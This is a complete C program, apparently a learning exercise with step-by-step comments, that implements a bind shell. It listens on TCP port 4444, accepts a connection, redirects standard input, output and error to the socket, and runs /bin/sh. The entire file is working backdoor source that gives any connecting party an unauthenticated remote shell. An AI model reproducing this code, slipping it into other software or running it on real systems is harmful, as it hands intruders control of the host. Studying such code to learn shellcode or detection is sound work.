#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#define BIND_PORT 4444
int main()
{

    //Defintion of the structers and variables
    int server_socket;
    int client_socket;
    char *arg[]={"/bin/sh",0};
    struct sockaddr_in server, client;
    int sockaddr_len=sizeof(struct sockaddr_in);
    //End of the definition

    server_socket=socket(AF_INET, SOCK_STREAM, 0);  //Create a socket

    server.sin_family=AF_INET;          //The protocol IP4=AF_INET is used
    server.sin_port=htons(BIND_PORT);  //Setting the listening port(4444)
    server.sin_addr.s_addr=INADDR_ANY; //
    bzero(&server.sin_zero,8);         // Setting the rest of the struct 0

    bind(server_socket, (struct sockaddr *) &server, sockaddr_len); //Systemcall of bind
    listen(server_socket,2);        //Systemcall Listen
    client_socket=accept(server_socket,(struct sockaddr *) &client, &sockaddr_len ); //Systemcall of accept

    close(server_socket);

    //Building afile descriptors for standard input(0), standard output(1) and standard error(2)
    dup2(client_socket,0);
    dup2(client_socket,1);
    dup2(client_socket,2);

    execve(arg[0],&arg[0],NULL); //Systemcall execve

}
